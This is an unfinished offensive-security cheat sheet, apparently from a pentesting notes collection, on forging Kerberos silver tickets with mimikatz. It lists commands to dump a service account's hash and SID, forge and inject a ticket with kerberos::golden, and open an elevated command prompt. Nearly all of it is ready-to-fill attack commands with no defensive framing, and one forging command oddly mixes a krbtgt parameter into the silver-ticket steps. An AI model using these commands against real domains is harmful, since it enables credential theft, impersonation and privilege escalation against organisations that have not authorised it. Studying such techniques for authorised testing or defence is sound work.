# Kerberos: Silver Ticket

#### STILL EDITING

#### Silver ticket (`mimikatz`)

1. Dump the hash and security identifier (SID) of the targeted service account:

```
mimikatz # lsadump::lsa /inject /name:<SERVICE_NAME>
```

1. Create a silver ticket:

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
mimikatz # kerberos::list
...
mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<USER_SID> /target:<SPN> /service:<SERVICE_PROTOCOL> /rc4:<SERVICE_HASH> /ptt

mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<USER_SID> /krbtgt:<SERVICE_NTLM_HASH> [/id:1103] [/ptt]
```

1. Open a new command prompt with elevated privileges with the given ticket:

```
mimikatz # misc::cmd
```
